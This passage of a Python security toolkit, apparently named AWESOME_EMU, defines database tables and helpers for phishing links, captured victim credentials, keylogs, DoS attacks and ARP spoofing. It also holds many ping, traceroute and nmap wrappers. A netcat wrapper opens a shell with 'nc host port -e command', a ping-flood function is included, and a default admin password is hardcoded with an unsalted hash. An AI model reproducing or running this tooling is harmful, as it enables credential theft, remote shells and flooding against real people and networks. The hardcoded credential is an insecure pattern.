                content TEXT,
                source TEXT
            )
            """,
            # DNS Cache
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            # Docker Scans
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Cracking Jobs
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            # NAT Info
            """
            CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Platform Commands
            """
            CREATE TABLE IF NOT EXISTS platform_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                command TEXT NOT NULL,
                user_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed BOOLEAN DEFAULT 0,
                result TEXT
            )
            """,
            # Email Messages
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # PDF Reports
            """
            CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )
            """,
            # Threat Monitors
            """
            CREATE TABLE IF NOT EXISTS threat_monitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                interval INTEGER DEFAULT 300,
                enabled BOOLEAN DEFAULT 1,
                last_scan DATETIME,
                next_scan DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Threat Monitor Results
            """
            CREATE TABLE IF NOT EXISTS threat_monitor_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                monitor_id INTEGER,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threats_found INTEGER DEFAULT 0,
                severity TEXT,
                output TEXT,
                FOREIGN KEY (monitor_id) REFERENCES threat_monitors(id)
            )
            """,
            # ARP Spoofing
            """
            CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME,
                UNIQUE(target_ip, gateway_ip)
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        """Create default admin user if not exists"""
        try:
            default_password = "awesome_emu_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        """Log a command execution"""
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log a threat detection"""
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        """Add an IP to managed IPs"""
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP in the database"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock an IP in the database"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get all managed IPs"""
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save a phishing link"""
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get all phishing links"""
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        """Save a captured credential"""
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        """Get system statistics"""
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
            stats['total_monitors'] = self.conn.execute("SELECT COUNT(*) FROM threat_monitors").fetchone()[0]
        except:
            pass
        return stats
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        """Save a keylog entry"""
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        """Get keylog entries"""
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
        except:
            pass

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Network utility functions"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        """Ping a target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        """Traceroute to a target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        """Run nmap scan"""
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "aggressive": ['nmap', '-A', '-T4', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target],
                "syn": ['nmap', '-sS', target],
                "connect": ['nmap', '-sT', target],
                "ack": ['nmap', '-sA', target],
                "fin": ['nmap', '-sF', target],
                "xmas": ['nmap', '-sX', target],
                "null": ['nmap', '-sN', target],
                "script": ['nmap', '-sC', target],
                "version": ['nmap', '--version'],
                "help": ['nmap', '--help']
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, 
             headers: Dict = None, options: str = "") -> CommandResult:
        """Execute curl request"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s']
            
            if method.upper() != "GET":
                cmd.extend(['-X', method.upper()])
            
            if data:
                cmd.extend(['-d', data])
            
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            
            if options:
                cmd.extend(options.split())
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None, options: str = "") -> CommandResult:
        """Execute wget download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-q']
            
            if output:
                cmd.extend(['-O', output])
            
            if options:
                cmd.extend(options.split())
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        """Execute netcat"""
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        """WHOIS lookup"""
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_public_ip() -> Optional[str]:
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return None
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        """Block IP via firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=AWESOME_EMU_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        """Unblock IP via firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=AWESOME_EMU_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        """Convert IP to domain name"""
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        """Convert domain to IP address"""
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        """Get MAC address vendor"""
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None

# =====================
# PING COMMANDS (20+)
# =====================
class PingCommands:
    """All ping command variants"""
    
    @staticmethod
    def basic(target: str) -> CommandResult:
        """Basic ping"""
        return NetworkTools.ping(target, 4)
    
    @staticmethod
    def count(target: str, count: int) -> CommandResult:
        """Ping with specific count"""
        return NetworkTools.ping(target, count)
    
    @staticmethod
    def flood(target: str) -> CommandResult:
        """Ping flood"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '1000', '-l', '65500', target]
            else:
                cmd = ['ping', '-f', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def size(target: str, size: int) -> CommandResult:
        """Ping with packet size"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-l', str(size), target]
            else:
                cmd = ['ping', '-s', str(size), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def interval(target: str, interval: float) -> CommandResult:
        """Ping with interval"""
        start_time = time.time()
        try:
            cmd = ['ping', '-i', str(interval), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def timeout(target: str, timeout: int) -> CommandResult:
        """Ping with timeout"""
        start_time = time.time()
        try:
            cmd = ['ping', '-W', str(timeout), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ttl(target: str, ttl: int) -> CommandResult:
        """Ping with TTL"""
        start_time = time.time()
        try:
            cmd = ['ping', '-t', str(ttl), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def interface(target: str, interface: str) -> CommandResult:
        """Ping using specific interface"""
        start_time = time.time()
        try:
            cmd = ['ping', '-I', interface, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def source(target: str, source_ip: str) -> CommandResult:
        """Ping with source IP"""
        start_time = time.time()
        try:
            cmd = ['ping', '-S', source_ip, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def pattern(target: str, pattern: str) -> CommandResult:
        """Ping with pattern"""
        start_time = time.time()
        try:
            cmd = ['ping', '-p', pattern, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def record_route(target: str) -> CommandResult:
        """Ping with record route"""
        start_time = time.time()
        try:
            cmd = ['ping', '-R', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def timestamp(target: str) -> CommandResult:
        """Ping with timestamps"""
        start_time = time.time()
        try:
            cmd = ['ping', '-D', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def quiet(target: str) -> CommandResult:
        """Quiet ping"""
        start_time = time.time()
        try:
            cmd = ['ping', '-q', '-c', '5', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def verbose(target: str) -> CommandResult:
        """Verbose ping"""
        start_time = time.time()
        try:
            cmd = ['ping', '-v', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ipv6(target: str) -> CommandResult:
        """IPv6 ping"""
        start_time = time.time()
        try:
            cmd = ['ping6', '-c', '4', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def sweep(network: str) -> CommandResult:
        """Ping sweep network"""
        start_time = time.time()
        try:
            cmd = ['nmap', '-sn', network]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def fping(targets: List[str]) -> CommandResult:
        """Fast ping multiple targets"""
        start_time = time.time()
        try:
            cmd = ['fping'] + targets
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def mtu(target: str, size: int) -> CommandResult:
        """Ping with MTU discovery"""
        start_time = time.time()
        try:
            cmd = ['ping', '-M', 'do', '-s', str(size), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def deadline(target: str, deadline: int) -> CommandResult:
        """Ping with deadline"""
        start_time = time.time()
        try:
            cmd = ['ping', '-w', str(deadline), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=deadline + 5)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def numeric(target: str) -> CommandResult:
        """Ping with numeric output"""
        start_time = time.time()
        try:
            cmd = ['ping', '-n', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def adaptive(target: str) -> CommandResult:
        """Adaptive ping"""
        start_time = time.time()
        try:
            cmd = ['ping', '-A', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def audible(target: str) -> CommandResult:
        """Audible ping"""
        start_time = time.time()
        try:
            cmd = ['ping', '-a', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# TRACEROUTE COMMANDS (25+)
# =====================
class TracerouteCommands:
    """All traceroute command variants"""
    
    @staticmethod
    def basic(target: str) -> CommandResult:
        """Basic traceroute"""
        return NetworkTools.traceroute(target)
    
    @staticmethod
    def tcp(target: str) -> CommandResult:
        """TCP traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-T', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def udp(target: str) -> CommandResult:
        """UDP traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-U', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def icmp(target: str) -> CommandResult:
        """ICMP traceroute"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-I', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_hops(target: str, hops: int) -> CommandResult:
        """Traceroute with max hops"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-m', str(hops), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def first_hop(target: str, hop: int) -> CommandResult:
        """Traceroute starting at specific hop"""
        start_time = time.time()
        try:
            cmd = ['traceroute', '-f', str(hop), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
